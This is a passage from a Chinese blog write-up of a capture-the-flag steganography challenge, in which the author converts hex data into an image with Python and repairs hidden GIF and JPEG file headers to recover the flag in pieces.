class="string">&quot;RGBA&quot;</span>,(width,heigth))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(heigth):</span><br><span class="line">                a=<span class="built_in">int</span>(f.read(<span class="number">2</span>),<span class="number">16</span>)</span><br><span class="line">                b=<span class="built_in">int</span>(f.read(<span class="number">2</span>),<span class="number">16</span>)</span><br><span class="line">                g=<span class="built_in">int</span>(f.read(<span class="number">2</span>),<span class="number">16</span>)</span><br><span class="line">                r=<span class="built_in">int</span>(f.read(<span class="number">2</span>),<span class="number">16</span>)</span><br><span class="line">                img.putpixel((i,j),(r,g,b,a))</span><br><span class="line">    plt.figure(<span class="string">&quot;Flandre&quot;</span>)</span><br><span class="line">    plt.imshow(img)</span><br><span class="line">    plt.show()</span><br><span class="line">    img.save(<span class="string">&quot;./www.png&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    paint(<span class="number">1080</span>,<span class="number">1467</span>,<span class="number">4</span>,<span class="string">r&quot;E:\aldlss\Downloads\IDM\mix_secret\sum.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>结果图如下：<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_ffflan.png" width=480 loading="lazy"></p>
<p>虽然有点抽象，但还是发现了神秘代码，结果直接当 flag 不对，各种解码也解不出来，最后请教了下出题人才知道原图还有东西我没有发现。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hardworking666/article/details/121335822">CTFmisc常见文件头和尾</a>，文件头都被藏起来了，但是文件尾还是有的，通过搜索文件尾发现有 gif 和 png 在里面，于是开始提取。首先提取的是 gif，参考了这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/zz460833359/article/details/123068320">GIF文件格式详解</a>，都是有例子的，还是挺好的，可以参照着看<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_2.png" alt="flan2" loading="lazy"><br>gif 把划出来的修改为 <code>47 49 46 38</code> 就好了，然后就可以用 python 提取了——foremost 不太靠谱，会碰到数据中的 gif 规定的结束字符提前结束提取，但实际上后面还有一大块都没提取出来，导致出来的图片基本上整张都是黑的。<br>提取出来的结果是这样的：<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_ffflan.gif" alt="flangif" loading="lazy"><br>可以看到 flag 的尾部已经出来了。<br>接下来是提取 png，png 这块有点不寻常，头部没有被替换，是有一块被直接删掉了，因此可以先提取出来，然后插入头部，具体格式可以参考这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45720193/article/details/127393748">【CTF】【winhex】超详细jpg图片结构分析</a>，不过插入数据的话其实找一张其他的 png 的文件头，复制过来就好了<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_3.png" alt="flan3" loading="lazy"><br>如图，在头部添加上这段 <code>ff d8 ff e0 00 10 4a 46 49 46 00 01 01 00 00 01 00 01 00 00 ff</code>，我的编辑器还会抽风，把 <code>00</code> 复制成 <code>20</code>，不知道为什么。顺带一提，后面的这个 <code>Adobe</code> 属实是有点误导了，找了很久相关的格式，最后发现好像并没有什么关系的样子。<br>提取出来的是这样的：<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_ffflan.jpg" alt="flanjpg" loading="lazy"><br>这样，flag 的前段、中段、后段就凑齐了。<br>不得不说，四张图，果然是四重存在啊，感觉是很好的创意。也恭喜芙兰获得人气投票冠军了，虽然更喜欢魔理沙一点。</p>
</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/ByteTech-Camp-5th-Notes/" rel="prev" title="第五届字节跳动青训营伴学笔记"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">第五届字节跳动青训营伴学笔记</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/o-ni-ma-i/" rel="next" title="漫谈别当欧尼酱了"><span class="post-nav-text">漫谈别当欧尼酱了</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/MayCTF2022-WP/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2022 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> aldlss</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-support"><span>背景图出处</span><a class="footer-support-logo" href="https://www.pixiv.net/users/8605991" target="blank" title="fasnakegod"><span>fasnakegod</span></a><span></span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div></body></html>